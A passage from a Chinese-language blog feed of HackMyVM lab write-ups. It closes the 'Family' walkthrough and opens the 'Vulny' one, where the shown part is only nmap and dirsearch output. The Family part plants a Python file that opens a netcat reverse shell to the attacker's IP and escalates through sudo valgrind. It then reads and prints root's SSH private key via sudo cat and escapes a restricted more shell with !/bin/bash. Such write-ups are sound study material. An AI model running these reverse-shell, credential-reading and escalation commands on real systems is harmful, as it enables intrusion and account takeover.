class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">www-<span class="symbol">data:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:www-data</span><span class="symbol">:/var/www</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">backup:</span><span class="symbol">x:</span><span class="number">34</span><span class="symbol">:</span><span class="number">34</span><span class="symbol">:backup</span><span class="symbol">:/var/backups</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">list:</span><span class="symbol">x:</span><span class="number">38</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:Mailing</span> <span class="title class_">List</span> <span class="title class_">Manager</span><span class="symbol">:/var/list</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">irc:</span><span class="symbol">x:</span><span class="number">39</span><span class="symbol">:</span><span class="number">39</span><span class="symbol">:ircd</span><span class="symbol">:/var/run/ircd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">gnats:</span><span class="symbol">x:</span><span class="number">41</span><span class="symbol">:</span><span class="number">41</span><span class="symbol">:Gnats</span> <span class="title class_">Bug</span>-<span class="title class_">Reporting</span> <span class="title class_">System</span> (admin)<span class="symbol">:/var/lib/gnats</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">65534</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:nobody</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">_apt:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">timesync:</span><span class="symbol">x:</span><span class="number">101</span><span class="symbol">:</span><span class="number">102</span><span class="symbol">:systemd</span> <span class="title class_">Time</span> <span class="title class_">Synchronization</span>,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">network:</span><span class="symbol">x:</span><span class="number">102</span><span class="symbol">:</span><span class="number">103</span><span class="symbol">:systemd</span> <span class="title class_">Network</span> <span class="title class_">Management</span>,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">resolve:</span><span class="symbol">x:</span><span class="number">103</span><span class="symbol">:</span><span class="number">104</span><span class="symbol">:systemd</span> <span class="title class_">Resolver</span>,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">messagebus:</span><span class="symbol">x:</span><span class="number">104</span><span class="symbol">:</span><span class="number">110</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sshd:</span><span class="symbol">x:</span><span class="number">105</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/run/sshd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">father:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:father</span>,,,<span class="symbol">:/home/father</span><span class="symbol">:/bin/bash</span></span><br><span class="line">systemd-<span class="symbol">coredump:</span><span class="symbol">x:</span><span class="number">999</span><span class="symbol">:</span><span class="number">999</span><span class="symbol">:systemd</span> <span class="title class_">Core</span> <span class="title class_">Dumper</span><span class="symbol">:/</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">mysql:</span><span class="symbol">x:</span><span class="number">106</span><span class="symbol">:</span><span class="number">113</span><span class="symbol">:MySQL</span> <span class="title class_">Server</span>,,,<span class="symbol">:/nonexistent</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">mother:</span><span class="symbol">x:</span><span class="number">1001</span><span class="symbol">:</span><span class="number">1001</span><span class="symbol">:</span>,,,<span class="symbol">:/home/mother</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">baby:</span><span class="symbol">x:</span><span class="number">1002</span><span class="symbol">:</span><span class="number">1002</span><span class="symbol">:</span>,,,<span class="symbol">:/home/baby</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure></div>
<p>同时father是mother这个文件夹的组成员，有写入权限，所以我们写一个py文件的反弹shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">father<span class="variable">@family</span><span class="symbol">:/home/mother</span><span class="variable">$ </span>cat check.py </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;nc 192.168.112.83 1235 -e /bin/bash&quot;</span>)</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 1235  </span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">1001</span>(mother) gid=<span class="number">1001</span>(mother) groups=<span class="number">1001</span>(mother)</span><br></pre></td></tr></table></figure></div>
<p>成功弹回mother的shell</p>
<h2 id="mother"><a href="#mother" class="headerlink" title="mother"></a>mother</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">mother<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> mother on <span class="symbol">family:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> mother may run the following commands on <span class="symbol">family:</span></span><br><span class="line">    (baby) <span class="symbol">NOPASSWD:</span> /usr/bin/valgrind</span><br></pre></td></tr></table></figure></div>
<p>mother可以不用密码的就用baby用户执行&#x2F;usr&#x2F;bin&#x2F;valgrind<br>找到valgrind的sudo利用方式，这个可以直接得到一个bash<br>得到baby的bash</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SWIFT"><figure class="iseeu highlight /swift"><table><tr><td class="code"><pre><span class="line">mother<span class="meta">@family</span>:<span class="regexp">/usr/</span>bin$ sudo <span class="operator">-</span>u baby <span class="regexp">/usr/</span>bin<span class="regexp">/valgrind /</span>bin<span class="operator">/</span>bash </span><br><span class="line"><span class="operator">==</span><span class="number">1324</span><span class="operator">==</span> <span class="type">Memcheck</span>, a memory error detector</span><br><span class="line"><span class="operator">==</span><span class="number">1324</span><span class="operator">==</span> <span class="type">Copyright</span> (<span class="type">C</span>) <span class="number">2002</span><span class="operator">-</span><span class="number">2017</span>, and <span class="type">GNU</span> <span class="type">GPL</span>&#x27;d, by <span class="type">Julian</span> <span class="type">Seward</span> et al.</span><br><span class="line"><span class="operator">==</span><span class="number">1324</span><span class="operator">==</span> <span class="type">Using</span> <span class="type">Valgrind</span><span class="operator">-</span><span class="number">3.14</span>.<span class="number">0</span> and <span class="type">LibVEX</span>; rerun with <span class="operator">-</span>h <span class="keyword">for</span> copyright info</span><br><span class="line"><span class="operator">==</span><span class="number">1324</span><span class="operator">==</span> <span class="type">Command</span>: <span class="regexp">/bin/</span>bash</span><br><span class="line"><span class="operator">==</span><span class="number">1324</span><span class="operator">==</span> </span><br><span class="line">baby<span class="meta">@family</span>:<span class="regexp">/usr/</span>bin$ </span><br></pre></td></tr></table></figure></div>
<h2 id="baby"><a href="#baby" class="headerlink" title="baby"></a>baby</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">baby<span class="variable">@family</span><span class="symbol">:/usr/bin</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> baby on <span class="symbol">family:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> baby may run the following commands on <span class="symbol">family:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/cat</span><br></pre></td></tr></table></figure></div>
<p>发现baby可以直接读取任意文件了 先尝试读取flag，但是发现没有这个文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">baby<span class="variable">@family</span><span class="symbol">:/usr/bin</span><span class="variable">$ </span>sudo /usr/bin/cat /root/*.txt</span><br><span class="line">/usr/bin/<span class="symbol">cat:</span> <span class="string">&#x27;/root/*.txt&#x27;</span>: <span class="title class_">No</span> such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure></div>
<p>那就去读.ssh&#x2F;id_rsa 先去拿root的私钥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JULIA"><figure class="iseeu highlight /julia"><table><tr><td class="code"><pre><span class="line">baby<span class="meta">@family</span>:/usr/bin$ sudo cat /root/.ssh/id_rsa</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEAnbuWFqguL1RgxPF2kO1Fv1pC4BIFjxOp+ATX3k4WvuJyEdrcAFB5</span><br><span class="line">esn89B6TTKjBffemI/Ppb6/KQ+RXjgh5ZtEzxmRHhO9v9OAcXm76M/<span class="number">0</span>wmG49v+nD79y53b</span><br><span class="line">KFMjcsqwvHZXjn4b3Wk1myQTC2sP763UNfBfd5ZH9uViBqT3NZQNrmzV8V534fZsGeHsMf</span><br><span class="line">vvdbU5yRWlQIHypurKs5jKtwXnRJqpTnDkics2SBcqaL+<span class="number">1</span>ivwZIyNlBvdS7YZBoxRasLG5</span><br><span class="line"><span class="number">3</span>UKg4SIc9K3ujdYtCDYYSGjRxHQLIDRx1wGDo4Bn3jBbZsHqT6A3mpx367jx08WHlcy+eb</span><br><span class="line">hGyuXtnBrwAAA8CBizlZgYs5WQAAAAdzc2gtcnNhAAABAQCdu5YWqC4vVGDE8XaQ7UW/Wk</span><br><span class="line">LgEgWPE6n4BNfeTha+<span class="number">4</span>nIR2twAUHl6yfz0HpNMqMF996Yj8+lvr8pD5FeOCHlm0TPGZEeE</span><br><span class="line"><span class="number">72</span>/<span class="number">04</span>Bxebvoz/TCYbj2/<span class="number">6</span>cPv3LndsoUyNyyrC8dleOfhvdaTWbJBMLaw/vrdQ18F93lkf2</span><br><span class="line"><span class="number">5</span>WIGpPc1lA2ubNXxXnfh9mwZ4ewx++<span class="number">91</span>tTnJFaVAgfKm6sqzmMq3BedEmqlOcOSJyzZIFy</span><br><span class="line">pov7WK/BkjI2UG91LthkGjFFqwsbndQqDhIhz0re6N1i0INhhIaNHEdAsgNHHXAYOjgGfe</span><br><span class="line">MFtmwepPoDeanHfruPHTxYeVzL55uEbK5e2cGvAAAAAwEAAQAAAQBKCYUXuXWETczmZJjM</span><br><span class="line">yjLU8N83If5t/ELp4gwZkvnmO5BjhSGDHEMJOcp8I+XsM8IvCJF5isHl5NPCLmpShvPFKS</span><br><span class="line">luVB+l7GXWwWNPiDP1N0EaK5TcgjOwYSD1SRhwS6mx1+OOY8QkF+GiZJXhN6ZpSiYiub7e</span><br><span class="line">pBzc6Vu3HZwJElUCvAuCxDbazc+RUT9VzH2BdQ3w1D66T8c3ruuRD8P86s0zf7/Bo/OmBi</span><br><span class="line">YeT/X3QcjyZTgmPjBR/m7nZNVUaDgWMCzIx2OecXX2bhdIVnpgVZVSq+EpidgvOPa/bjfQ</span><br><span class="line">AXB5vEuQ7lGz15Hx2isz5ai/zAKIGY33omnDT3f4ESvRAAAAgCkSIIvDtArb/<span class="number">6</span>jXQb57In</span><br><span class="line">aExbm6PurE05TEHj/COnGSjD0iWk6CFFs33ud1A4FX1ACEVkEh51KBukSGhOXHd/nAH56i</span><br><span class="line">pL4h5vmyt3JqLlilSkRju2oOH1I5edxIbTHD5aFHssD3l2OSaO4ax/h42BVp+Xr63FdDbS</span><br><span class="line">NV8qd9gYp7AAAAgQDM02e+O6t1J+X41VaGRuJTnYCfWXKA5KnmmDM5UKQHm4i0dXL9xWgE</span><br><span class="line">bBrFggoE2XsowMLRGOPe0ijuXOkgkpCeSB/rxmQ+Nn2x2O/H7yoIgl1IbpNIK6EZTaCebC</span><br><span class="line">lfdn0hK55BSl394ql0y4ns91E4XL0Xvc9RDlBvGF5BAd/KwwAAAIEAxSQf51F5oIYIvl4l</span><br><span class="line"><span class="number">9</span>y3g77L+VlV0Yg9iLunUT/km9abp9e2oTsNXN3e9IHja5GVxOUjhlBC8Yposlv/oaAApJu</span><br><span class="line">KC9XLqjqEmpo5gq61fG0HRPOkt1DKNuR3zIrWHot0DificHPyGISeu1/oR8tr9OR6Hmlvh</span><br><span class="line">+AY4rKYqqUj+hqUAAAALcm9vdEBmYW1pbHk=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># chmod 600 id_rsa                                  </span></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># ssh root@192.168.112.12 -i id_rsa</span></span><br><span class="line">The authenticity of host &#x27;<span class="number">192.168</span><span class="number">.112</span><span class="number">.12</span> (<span class="number">192.168</span><span class="number">.112</span><span class="number">.12</span>)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:c8APAkc6cpobBp5TlsyZ0NGBR6ZK9zbWY5binXumQhU.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;<span class="number">192.168</span><span class="number">.112</span><span class="number">.12</span>&#x27; (ED25519) to the list of known hosts.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          oooo$$$$$$$$$$$$oooo</span><br><span class="line">                      oo$$$$$$$$$$$$$$$$$$$$$$$$o</span><br><span class="line">                   oo$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o         o$   $$ o$</span><br><span class="line">   o $ oo        o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o       $$ $$ $$o$</span><br><span class="line">oo $ $ <span class="string">&quot;$      o$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$<span class="variable">$o</span>       $$<span class="variable">$o</span>$<span class="variable">$o</span>$</span></span><br><span class="line"><span class="string">&quot;</span>$$$$$$o$     o$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$o    $$$$$$$$</span><br><span class="line">  $$$$$$$    $$$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">  $$$$$$$$$$$$$$$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$$$$$$  <span class="string">&quot;&quot;&quot;$$$</span></span><br><span class="line"><span class="string">   &quot;$$$&quot;&quot;&quot;</span><span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     &quot;</span>$$$</span><br><span class="line">    $$$   o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     <span class="string">&quot;$$<span class="variable">$o</span></span></span><br><span class="line"><span class="string">   o$$&quot;</span>   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$       $$$o</span><br><span class="line">   $$$    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$<span class="string">&quot; &quot;</span>$$$$$$ooooo$$$$o</span><br><span class="line">  o$$$oooo$$$$$  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$   o$$$$$$$$$$$$$$$$$</span><br><span class="line">  $$$$$$$$<span class="string">&quot;$$$$   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     $$$$&quot;</span><span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"> &quot;</span><span class="string">&quot;&quot;&quot;       $$$$    &quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;      o$$$</span></span><br><span class="line"><span class="string">            &quot;$$<span class="variable">$o</span>     &quot;&quot;&quot;</span>$$$$$$$$$$$$$$$$$$<span class="string">&quot;$$&quot;</span>         $$$</span><br><span class="line">              $$$o          <span class="string">&quot;$$&quot;</span><span class="string">&quot;$$$$$$&quot;</span><span class="string">&quot;&quot;&quot;           o$$$</span></span><br><span class="line"><span class="string">               $$$<span class="variable">$o</span>                 oo             o$$$&quot;</span></span><br><span class="line"><span class="string">                &quot;$$$<span class="variable">$o</span>      o$$$$$<span class="variable">$o</span>&quot;$$$<span class="variable">$o</span>        o$$$$</span></span><br><span class="line"><span class="string">                  &quot;$$$$<span class="variable">$oo</span>     &quot;&quot;$$$<span class="variable">$o</span>$$$$<span class="variable">$o</span>   o$$$$&quot;&quot;  </span></span><br><span class="line"><span class="string">                     &quot;&quot;$$$$<span class="variable">$oooo</span>  &quot;$$<span class="variable">$o</span>$$$$$$$$$&quot;&quot;&quot;</span></span><br><span class="line">                        <span class="string">&quot;&quot;</span>$$$$$$$oo $$$$$$$$$$       </span><br><span class="line">                                <span class="string">&quot;&quot;&quot;&quot;$$$$$$$$$$$        </span></span><br><span class="line"><span class="string">                                    $$$$$$$$$$$$       </span></span><br><span class="line"><span class="string">                                     $$$$$$$$$$&quot;      </span></span><br><span class="line"><span class="string">                                      &quot;$$$&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--More--(99%)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
<p>但是在里面没法用命令，而且一会就断开连接。<br>这里看了wp知道要去看看公钥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">baby<span class="variable">@family</span><span class="symbol">:/usr/bin</span><span class="variable">$ </span>sudo cat /root/.ssh/authorized_keys</span><br><span class="line">command=<span class="string">&quot;bash ~/troll.sh&quot;</span> ssh-rsa <span class="title class_">AAAAB3NzaC1yc2EAAAADAQABAAABAQCdu5YWqC4vVGDE8XaQ7UW</span>/<span class="title class_">WkLgEgWPE6n4BNfeTha</span>+<span class="number">4</span>nIR2twAUHl6yfz0HpNMqMF996Yj8+lvr8pD5FeOCHlm0TPGZEeE72/<span class="number">04</span>Bxebvoz/<span class="title class_">TCYbj2</span>/<span class="number">6</span>cPv3LndsoUyNyyrC8dleOfhvdaTWbJBMLaw/vrdQ18F93lkf25WIGpPc1lA2ubNXxXnfh9mwZ4ewx++<span class="number">91</span>tTnJFaVAgfKm6sqzmMq3BedEmqlOcOSJyzZIFypov7WK/<span class="title class_">BkjI2UG91LthkGjFFqwsbndQqDhIhz0re6N1i0INhhIaNHEdAsgNHHXAYOjgGfeMFtmwepPoDeanHfruPHTxYeVzL55uEbK5e2cGv</span> root<span class="variable">@family</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这里发现公钥中执行了troll.sh文件，去看看这个脚本里面有什么</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">baby@family:<span class="regexp">/usr/</span>bin$ sudo cat <span class="regexp">/root/</span>troll.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">export TERM=xterm</span><br><span class="line">more <span class="regexp">/root/</span>welcome.txt</span><br><span class="line"><span class="keyword">exit</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></div>
<p>发现这里使用了more去读取了welcome.txt，在gofobins中找到跳出这个受限shell的办法<br><img src="https://pic1.imgdb.cn/item/67ad867ad0e0a243d4fec512.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">!<span class="regexp">/bin/bash</span></span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>成功拿到rootshell  结束</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到了wordpress在可以安装插件的时候的通杀方法，安装WPTerm这个插件来反弹shell。<br>在提权过程中 查看.bash_history找到敏感文件位置<br>最后了解了valgrind可以运行&#x2F;bin&#x2F;bash直接得到一个bash<br>ssh登录有问题的时候，看看公钥文件，~&#x2F;authorized_keys<br>学习了more指令跳出受限bash的方法 !&#x2F;bin&#x2F;bash<br>这里再了解一些more如果有sudo权限的提权方式</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">TERM= <span class="built_in">sudo</span> more /etc/profile</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Vulny</title>
    <url>/posts/19932.html</url>
    <content><![CDATA[<p>HMV-Vulny靶场复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679ddc0dd0e0a243d4f97365.png"><br>这个靶机是一个ubuntu系统的靶机，前面获取不到靶机ip，修改了好长时间，不过也正好补充我的靶机配置博客<br>解决方案在： <a href="/posts/86.html" title="mac环境靶场搭建">mac环境靶场搭建</a></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.240.139  </span></span><br><span class="line"><span class="params">sh:</span> <span class="number">0</span>: getcwd() <span class="params">failed:</span> No such file <span class="keyword">or</span> directory</span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">01</span> <span class="number">16</span>:<span class="number">32</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.139</span> (<span class="number">192.168</span>.<span class="number">240.139</span>)</span><br><span class="line">Host is up (<span class="number">0.0026</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">41</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-title:</span> Apache2 Ubuntu Default <span class="params">Page:</span> It works</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.41</span> (Ubuntu)</span><br><span class="line">MAC <span class="params">Address:</span> B2:A7:<span class="number">1</span>A:<span class="number">3</span>F:<span class="number">30</span>:A9 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.61</span> ms <span class="number">192.168</span>.<span class="number">240.139</span> (<span class="number">192.168</span>.<span class="number">240.139</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.33</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>显示只有一个80的web端口 我们下一步就去web找更多信息</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>web默认界面是ubuntu系统界面，没有多余信息<br>目录扫描：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u 192.168.240.139</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.240.139/_25-02-01_16-36-17.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.139</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span>                                  